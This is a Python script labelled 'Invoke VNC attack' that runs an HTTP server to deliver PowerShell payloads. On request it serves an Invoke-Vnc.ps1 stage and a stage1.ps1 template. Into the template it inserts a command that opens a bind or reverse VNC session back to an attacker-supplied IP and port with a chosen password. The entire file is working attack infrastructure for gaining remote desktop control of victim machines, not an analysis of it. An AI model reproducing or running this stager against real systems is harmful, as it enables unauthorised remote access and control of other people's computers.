#!/usr/bin/python

"""
Invoke VNC attack
Build by El3ct71k, Nimrod Levy (scorpiones)
El3ct71k@Gmail.com
"""

import os
import urlparse
import time
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

abspath = os.path.abspath(__file__)
CURR_DIR = os.path.dirname(abspath)


class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        path = urlparse.urlparse(self.path)
        path = urlparse.parse_qs(path.query)
        if 'stage' in path:
            with open("%s/Invoke-Vnc.ps1" % CURR_DIR, 'rb') as file_obj:
                content = file_obj.read()
                with open("%s/EOF" % CURR_DIR, 'w') as file_obj:
                    file_obj.write("1")
                self.wfile.write(content)
        else:
            if 'attack_type' in path and 'port' in path and 'password' in path:
                with open("%s/stage1.ps1" % CURR_DIR, 'rb') as file_obj:
                    content = file_obj.read().replace("IP_ADDRESS", self.client_address[0])
                    if path['attack_type'][0] == "bind":
                        attack_command = "Invoke-Vnc -ConType bind -Port {port} -Password {password}".format(
                            port=path['port'][0], password=path['password'][0]
                        )
                    else:
                        attack_command = "Invoke-Vnc -ConType reverse -IpAddress {attacker_ip} -Port {port} -Password {password}".format(
                            attacker_ip=path['attacker_ip'][0], port=path['port'][0], password=path['password'][0]
                        )
                    content = content.replace("ATTACK_COMMAND", attack_command)
                    content = content.replace("SERVER_IP", self.headers.get('Host'))
                self.wfile.write(content)

    def log_message(self, format, *args):
        pass

    def do_HEAD(self):
        self._set_headers()


def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()


if __name__ == "__main__":
    run()
